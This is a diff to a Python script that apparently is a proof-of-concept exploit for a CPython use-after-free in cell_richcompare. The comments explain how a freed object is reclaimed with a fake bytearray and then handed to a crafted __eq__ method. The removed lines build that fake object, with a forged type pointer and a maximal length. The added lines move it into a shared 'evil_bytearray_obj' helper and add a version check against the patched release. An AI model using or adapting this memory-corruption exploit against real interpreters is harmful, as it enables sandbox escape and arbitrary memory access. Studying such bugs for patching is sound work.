@@ -36,6 +36,10 @@ cell_richcompare(PyObject *a, PyObject *b, int op)
 # bytearray object, and then we return NotImplemented. After returning NotImplemented, it will be passed to `catch.__eq__`
 # where the `other` arg will be the freed object (which is now our fake bytearray object)
 
+from common import check_pyversion, evil_bytearray_obj
+
+check_pyversion(patched_ver=(3, 13, 1))
+
 def cell_gen(x=0):
     def _():
         nonlocal x
@@ -60,15 +64,8 @@ class catch:
         global mem
         mem = other
 
-p64 = lambda num: num.to_bytes(8, 'little')
-fake_obj = (
-    p64(0x12345) +
-    p64(id(bytearray)) +
-    p64(2**63 - 1) +
-    p64(2**63 - 1) +
-    p64(0) +
-    p64(0)
-)
+# see ./common/common.py for evil bytearray obj explanation
+fake_obj, _ = evil_bytearray_obj()
 
 SIZE = 0x100
 
